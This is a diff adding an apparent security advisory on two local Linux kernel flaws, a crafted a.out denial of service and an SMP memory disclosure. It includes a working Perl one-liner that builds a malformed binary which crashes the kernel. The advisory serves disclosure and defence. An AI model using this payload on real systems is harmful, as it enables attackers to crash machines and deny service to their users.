@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/11754/info
+
+The Linux kernel is reported prone to multiple local vulnerabilities:
+
+- A handcrafted 'a.out' file may be used to trigger a local denial-of-service condition. A local attacker may exploit this vulnerability to trigger a system-wide denial of service, potentially resulting in a kernel panic. 
+
+- A memory-disclosure vulnerability reportedly affects only SMP computers with more than 4GB of memory. A local attacker may exploit this vulnerability to access random pages of physical memory.
+
+perl -e'print"\x07\x01".("\x00"x13)."\xc0".("\x00"x16)' > eout 
+
+Executing the resulting 'eout' file reportedly results in a kernel oops. Repeatedly running the resulting file will consume file descriptors and memory.
